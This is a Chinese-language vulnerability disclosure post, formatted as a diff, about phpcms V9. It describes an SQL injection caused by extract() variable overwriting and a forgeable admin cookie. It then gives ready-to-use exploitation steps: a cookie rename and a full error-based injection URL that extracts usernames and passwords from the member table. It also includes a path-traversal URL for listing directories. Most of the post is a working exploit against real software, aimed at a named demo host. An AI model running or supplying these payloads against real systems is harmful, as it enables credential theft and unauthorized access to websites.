@@ -1,0 +1,48 @@
+phpcmsV9SQL注射+列目录
+2012年1月26日 落叶 发表评论 阅读评论 
+漏洞作者： kobin97
+提交时间： 2012-01-20
+公开时间： 2012-01-25
+ 
+
+漏洞文件：phpcms\modules\attachment\attachments.php
+SQL注射漏洞相关代码：
+
+public function album_load() {
+if(!$this->admin_username) return false;
+if($_GET['args']) extract(getswfinit($_GET['args']));
+if($_GET['dosubmit']){
+extract($_GET['info']);
+if($filename) $where = "AND `filename` LIKE '%$filename%' ";
+
+
+可以看出extract 存在变量覆盖，从而造成注入。
+再看
+$this->admin_username
+$this->admin_username = param::get_cookie('admin_username');
+
+
+
+所以可以随意构造绕过。
+利用过程
+首先访问：
+
+http://v9.demo.phpcms.cn/index.php?m=attachment&c=attachments&a=swfupload_json
+
+会生成Cookie，YuHYi_att_json
+修改cookie 文称为YuHYi_admin_username
+再访问
+
+http://v9.demo.phpcms.cn/index.php?m=attachment&c=attachments&a=album_load&t=1&dosubmit=true&info[where]=%201=1%20and%20%28select%201%20from%28select%20count%28*%29,concat%280x7c,%28select%20concat%28username,0x7c,password%29%20from%20v9_member%20%20limit%200,1%29,0x7c,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1%29a%29%23
+
+即可暴出
+
+
+
+列目录漏洞：
+访问：
+
+http://v9.demo.phpcms.cn/index.php?m=attachment&c=attachments&a=album_dir&dir=…/../…/…///phpsso_server/
+
+绕过过滤
+
